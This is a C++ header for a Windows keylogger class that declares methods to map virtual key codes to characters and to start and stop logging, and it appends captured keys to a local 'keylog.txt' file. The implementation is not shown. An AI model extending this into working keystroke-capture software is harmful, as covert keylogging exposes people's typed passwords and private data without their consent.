#ifndef KEYLOG_H
#define KEYLOG_H

#include <Windows.h>
#include <mutex>
#include <spdlog/spdlog.h>
#include <string>


class KeyLogger {
private:
  std::mutex logMutex;
  bool running;
  FILE *logFile;

  // Convert virtual key code to readable character
  std::string GetKeyName(int vkCode, bool shiftPressed, bool capsLock);

public:
  KeyLogger() : running(true), logFile(nullptr) {
    // Initialize file logging
    logFile = fopen("keylog.txt", "a");
    if (!logFile) {
      spdlog::error("Failed to open log file");
    }
  }

  ~KeyLogger() {
    if (logFile) {
      fclose(logFile);
    }
  }

  void StartLogging();

  void Stop() { running = false; }
};

#endif /* KEYLOG_H */
